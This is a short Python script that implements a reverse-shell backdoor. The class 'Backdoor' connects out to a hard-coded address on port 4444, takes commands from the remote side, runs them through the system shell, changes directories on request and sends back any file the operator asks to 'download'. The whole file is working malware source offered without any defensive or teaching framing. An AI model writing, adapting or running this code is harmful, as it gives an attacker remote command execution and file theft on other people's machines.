#!/usr/bin/env python3
import socket, subprocess, json, os

class Backdoor:
    def __init__(self, ip , port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.connection.send("\n[+] Connecfion Established... \n")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    @staticmethod
    def execute_system_command(command):
        return subprocess.check_output(command, shell=True)

    @staticmethod
    def change_working_dir(path):
        os.chdir(path)
        return "[+] Changing working dir to" + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return file.read()

    def run(self):
        while True:
            command = self.reliable_receive()
            command_result = ""
            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_dir(command[1])
            elif command[0] == "download" and len(command) > 1:
                command_result = self.read_file(command[1])
            else:
                command_result = self.execute_system_command(command)

            self.reliable_send(command_result)
my_backdoor = Backdoor("192.168.119.140", 4444)
my_backdoor.run()
